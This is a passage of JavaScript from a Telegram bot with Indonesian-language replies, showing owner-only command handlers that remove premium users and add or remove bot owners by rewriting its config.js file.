    const premiumUsers = loadPremiumUsers();
    const index = premiumUsers.indexOf(userId);

    if (index === -1) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENGHAPUS
│────────────────
│ User ${userId} tidak
│ terdaftar sebagai premium
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers(premiumUsers);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENGHAPUS  
│────────────────
│ ID: ${userId}
│ Status: User Biasa
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing premium user:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus user premium. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `\`\`\`
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────\`\`\``,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
  BOT_TOKEN: "${config.BOT_TOKEN}",
  OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
};`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `\`\`\`
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────\`\`\``,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});


